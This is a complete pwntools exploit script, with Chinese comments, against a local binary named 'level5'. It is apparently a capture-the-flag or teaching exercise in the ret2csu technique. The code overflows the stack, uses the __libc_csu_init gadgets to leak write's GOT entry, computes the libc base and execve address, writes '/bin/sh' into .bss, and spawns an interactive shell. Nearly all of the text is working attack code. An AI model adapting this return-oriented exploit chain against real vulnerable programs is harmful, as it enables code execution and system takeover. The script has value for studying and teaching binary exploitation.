from pwn import *

sh = process('./level5')
elf = ELF('./level5')
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") # 通过ldd查找的本程序所使用的libc文件

#获取write函数的got地址
write_got_addr = elf.got['write']
#获取read函数的got地址
read_got_addr = elf.got['read']
#程序main函数的函数地址
main_addr = elf.symbols['main']
#程序bss段地址
bss_base_addr = elf.bss()

# 两段gadgets的首地址
gadgets2_addr = 0x4005F0
gadgets1_addr = 0x400606


def com_gadget(null, rbx, rbp, r12, r13, r14, r15, main_addr):
  #null为0x8空缺
  #main为main函数地址
    payload = b'a' * 0x88 
    payload += p64(gadgets1_addr)
    payload += p64(null) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(gadgets2_addr)
    payload += b'a' * 56     #56个字节填充平衡堆栈造成的空缺
    payload += p64(main_addr)
    sh.send(payload)    
    sleep(0.5)						#暂停等待接收

sh.recvuntil('Hello, World\n')

# payload1
'''我们要利用write函数得到got表项中write@got的值，然后通过这个值计算出system函数的实际地址'''
com_gadget(0,0, 1, write_got_addr, 1, write_got_addr, 8, main_addr)

# calculate base address and execve address
write_addr = u64(sh.recv(8))    
libc_base = write_addr - libc.symbols['write'] 
execve_addr = libc_base + libc.symbols['execve'] 

sh.recvuntil('Hello, World\n')
# payload2
'''我们要利用read函数将system的地址和参数“/bin/sh”写入到程序的bss区。'''
com_gadget(0,0, 1, read_got_addr, 0, bss_base_addr, 16, main_addr)
sh.send(p64(execve_addr) + b'/bin/sh\x00')

sh.recvuntil('Hello, World\n')
# payload3
'''以“/bin/sh”为参数调用system'''
com_gadget(0,0, 1, bss_base_addr, bss_base_addr+8, 0, 0, main_addr)
sh.interactive()


